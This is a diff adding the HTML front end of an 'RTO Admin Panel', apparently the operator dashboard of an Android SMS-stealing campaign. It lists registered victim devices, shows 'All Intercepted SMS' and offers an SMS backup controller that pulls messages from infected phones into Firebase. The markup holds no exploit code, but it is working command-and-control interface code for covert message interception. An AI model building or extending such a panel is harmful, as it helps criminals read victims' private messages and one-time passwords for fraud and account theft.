@@ -1,0 +1,149 @@
+<!-- ============================================================ -->
+<!-- index.html - Main HTML Structure                              -->
+<!-- ============================================================ -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>RTO Admin Panel</title>
+
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js">
+    </script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js">
+    </script>
+
+    <!-- External CSS -->
+    <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+    <div class="app-container" id="app">
+
+        <!-- ===== HEADER ===== -->
+        <header class="header">
+            <div class="header-left">
+                <div class="logo">RTO<span>Admin</span></div>
+                <span class="sub" id="userIdDisplay">ID: samji624</span>
+            </div>
+            <div class="status-badge offline" id="statusBadge">
+                <span class="dot"></span>
+                <span id="statusText">Connecting...</span>
+            </div>
+        </header>
+
+        <!-- ===== MASTER CONTROLS ===== -->
+        <div class="master-grid">
+            <button class="master-btn" id="btnDevices" onclick="togglePanel('devices')">
+                <i class="fas fa-mobile-alt"></i> Devices
+                <span class="badge" id="deviceCount">0</span>
+            </button>
+            <button class="master-btn" id="btnSms" onclick="togglePanel('sms')">
+                <i class="fas fa-envelope"></i> All SMS
+                <span class="badge" id="smsCount">0</span>
+            </button>
+            <button class="master-btn" id="btnBackup" onclick="togglePanel('backup')">
+                <i class="fas fa-database"></i> Backup
+                <span class="badge" id="backupStatusBadge">Ready</span>
+            </button>
+        </div>
+
+        <!-- ===== DEVICES PANEL ===== -->
+        <div class="panel" id="panelDevices">
+            <div class="panel-header">
+                <h3><i class="fas fa-mobile-alt" style="color:var(--green);"></i> Registered Devices</h3>
+                <span class="count" id="panelDeviceCount">0 devices</span>
+            </div>
+            <div id="devicesContainer">
+                <div class="loading-placeholder"><i class="fas fa-spinner fa-spin"></i> Loading devices...</div>
+            </div>
+        </div>
+
+        <!-- ===== ALL SMS PANEL ===== -->
+        <div class="panel" id="panelSms">
+            <div class="panel-header">
+                <h3><i class="fas fa-envelope" style="color:var(--blue);"></i> All Intercepted SMS</h3>
+                <span class="count" id="panelSmsCount">0 messages</span>
+            </div>
+            <div id="allSmsContainer">
+                <div class="loading-placeholder"><i class="fas fa-spinner fa-spin"></i> Loading messages...</div>
+            </div>
+            <button class="load-more-btn" id="allSmsLoadMore" onclick="loadMoreAllSms()" style="display:none;">
+                <i class="fas fa-chevron-down"></i> Load More SMS
+            </button>
+        </div>
+
+        <!-- ===== BACKUP PANEL ===== -->
+        <div class="panel" id="panelBackup">
+            <div class="panel-header">
+                <h3><i class="fas fa-database" style="color:var(--purple);"></i> SMS Backup Controller</h3>
+            </div>
+
+            <div class="backup-device-select">
+                <label>Select Device:</label>
+                <select id="backupDeviceSelect">
+                    <option value="">-- Select a device --</option>
+                </select>
+            </div>
+
+            <div class="backup-status-box" id="backupStatusBox">
+                <div class="status-row">
+                    <span class="label">📊 Status:</span>
+                    <span class="value" id="backupStatusValue">No backup initiated</span>
+                </div>
+                <div class="status-row">
+                    <span class="label">📅 Last Backup:</span>
+                    <span class="value" id="backupLastTime">Never</span>
+                </div>
+                <div class="status-row">
+                    <span class="label">📨 SMS Count:</span>
+                    <span class="value" id="backupSmsCount">0</span>
+                </div>
+                <div class="status-row">
+                    <span class="label">💾 Backup ID:</span>
+                    <span class="value" id="backupId" style="font-size:11px;color:var(--text-muted);">N/A</span>
+                </div>
+            </div>
+
+            <div class="backup-actions">
+                <button class="cmd-btn purple-btn" onclick="triggerBackup()">
+                    <i class="fas fa-play"></i> Backup Now
+                </button>
+                <button class="cmd-btn blue-btn" onclick="refreshBackupStatus()">
+                    <i class="fas fa-sync"></i> Refresh
+                </button>
+                <button class="cmd-btn danger-btn" onclick="clearBackupStatus()">
+                    <i class="fas fa-trash"></i> Clear Status
+                </button>
+            </div>
+        </div>
+
+        <!-- ===== SMS DETAIL MODAL ===== -->
+        <div class="modal-overlay" id="smsModal" onclick="closeSmsModal(event)">
+            <div class="modal-content" onclick="event.stopPropagation()">
+                <div class="modal-header">
+                    <h3 id="modalTitle">📩 Messages</h3>
+                    <button class="modal-close" onclick="closeSmsModal()">✕ Close</button>
+                </div>
+                <div class="modal-body" id="modalBody">
+                    <div class="loading-placeholder"><i class="fas fa-spinner fa-spin"></i> Loading...</div>
+                </div>
+                <button class="load-more-btn" id="modalLoadMore" onclick="loadMoreModalSms()" style="display:none; margin:10px 16px 16px 16px;">
+                    <i class="fas fa-chevron-down"></i> Load More SMS
+                </button>
+            </div>
+        </div>
+
+        <!-- ===== TOAST CONTAINER ===== -->
+        <div id="toastContainer"></div>
+
+    </div>
+
+    <!-- External JavaScript -->
+    <script src="app.js"></script>
+</body>
+</html>
